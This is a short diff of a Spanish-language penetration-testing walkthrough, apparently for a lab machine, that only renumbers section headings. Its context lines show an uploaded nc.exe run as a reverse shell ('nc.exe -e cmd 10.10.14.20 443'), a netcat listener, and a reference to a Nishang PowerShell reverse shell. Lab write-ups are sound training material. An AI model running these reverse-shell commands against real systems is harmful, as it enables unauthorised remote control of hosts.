@@ -28,7 +28,7 @@
 
 ![](./images/targeted.png)
 
-### 2.1 Web
+### 2.2 Web
 
 * Haciendo uso de firefox, se analiza el contenido de la página web junto con las herramientas de desarrollador. 
 
@@ -69,7 +69,7 @@ local: nc.exe remote: nc.exe
 ftp>
 ```
 
-### 3.1 Reverse Shell con nc.exe
+### 3.2 Reverse Shell con nc.exe
 
 * El directorio raiz que utiliza ASP.NET es C:\inetpub\wwwroot\.
 
@@ -83,7 +83,7 @@ C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.20 443
 rlwrap nc -lvnp 443
 ```
 
-### 3.2 Reverse shell con Nishang
+### 3.3 Reverse shell con Nishang
 
 * Compartimos la shell en powershell com **impacket-smbserver** dando soporte a SMB2.
 
